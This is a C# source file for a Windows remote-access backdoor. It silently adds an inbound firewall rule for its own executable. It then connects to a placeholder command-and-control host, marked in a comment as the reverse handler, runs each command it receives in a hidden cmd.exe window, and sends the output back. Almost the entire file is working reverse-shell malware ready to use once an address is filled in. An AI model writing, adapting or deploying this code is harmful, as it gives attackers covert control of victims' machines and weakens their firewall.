using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;

namespace ds

{
    static class Program
    {
        public static TcpListener getServer(System.Net.IPAddress IPAd)
        {
            int[] table = { 29034, 62001, 33333, 24097, 55555 };
            for (int i = 0; i < table.Length; i++)
            {
                try
                {
                    TcpListener serverSock_ = new TcpListener(IPAd, table[i]);
                    return serverSock_;
                }
                catch
                {
                }
            }
            TcpListener serverSock = new TcpListener(IPAd, 66666);
            return serverSock;
        }
        public static string rc(string c)
        {
            int PROCESS_TIMEOUT = 100000;
            Process process = new Process();
            StringBuilder outputStringBuilder = new StringBuilder();
            try

            {
                process.StartInfo.FileName = "cmd.exe";                  
                process.StartInfo.Arguments = "/c " + c;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.EnableRaisingEvents = false;
                process.OutputDataReceived += (sender, eventArgs) => outputStringBuilder.AppendLine(eventArgs.Data);
                process.ErrorDataReceived += (sender, eventArgs) => outputStringBuilder.AppendLine(eventArgs.Data);
                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                var processExited = process.WaitForExit(PROCESS_TIMEOUT);
                try
                {
                    string Ret = process.StandardOutput.ReadToEnd();
                    process.Kill();
                    return Ret;
                }
                catch
                {
                    if (processExited == false)
                    {
                        string Ret = outputStringBuilder.ToString();
                        process.Kill();
                        return Ret;
                    }
                    else if (process.ExitCode != 0)
                    {
                        string output = outputStringBuilder.ToString();
                        return output;
                    }
                    else
                    {
                        process.Close();
                        string output = outputStringBuilder.ToString();
                        return output;
                    }
                }
            }
            catch
            {
                process.Close();
                return "...............................";
            }
        }

        public static void SetStartup()
        {
            try

            {
                string Q = Directory.GetCurrentDirectory();
                Q += "\\ds.exe";
                string Re = rc("netsh advfirewall firewall add rule name=\"allowedprogram\" dir=in action=allow program=\"" + Q + "\" enable=yes");
            }
            catch
            {
            }

        }
        public static System.Net.IPAddress GetLocalIPAddress()

        {
            var h = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in h.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip;
                }
            }
            return IPAddress.Parse("127.0.0.1");
        }
        public static void Runserver()
        {

            TcpClient tcpint = new TcpClient();
            bool Auth = false;
            tcpint.Connect("your C&C Server", your port); // The Reverse Handler....
            Byte[] sBytes = Encoding.ASCII.GetBytes("Client Hello");
            int requestCount = 0;
            requestCount = 0;
            requestCount = requestCount + 1;
            NetworkStream networkStream = tcpint.GetStream();
            networkStream.Write(sBytes, 0, sBytes.Length);
            networkStream.Flush();
            while ((true))
            {
                try
                {
                    byte[] bytesFrom = new byte[tcpint.ReceiveBufferSize];
                    networkStream.Read(bytesFrom, 0, bytesFrom.Length);
                    string dataFromClient = System.Text.Encoding.ASCII.GetString(bytesFrom);
                    string ret = rc(dataFromClient);
                    string serverResponse = ret;
                    Byte[] sendBytes = Encoding.ASCII.GetBytes(serverResponse);
                    networkStream.Write(sendBytes, 0, sendBytes.Length);
                    networkStream.Flush();
                    System.Threading.Thread.Sleep(5000);
                }
                catch
                {
                }
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
        [STAThread]
        static void Main(string[] args)
        {
            SetStartup();
            Runserver();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
